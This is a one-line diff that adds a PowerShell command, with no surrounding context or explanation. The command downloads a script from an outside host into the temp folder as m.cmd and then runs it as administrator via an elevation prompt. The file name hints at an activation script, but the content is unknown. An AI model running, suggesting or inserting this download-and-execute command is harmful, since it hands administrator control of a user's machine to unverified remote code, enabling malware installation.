@@ -1,0 +1,1 @@
+irm https://jxawj.de5.net/mas -OutFile "$env:TEMP\m.cmd"; saps cmd "/c $env:TEMP\m.cmd" -Verb RunAs
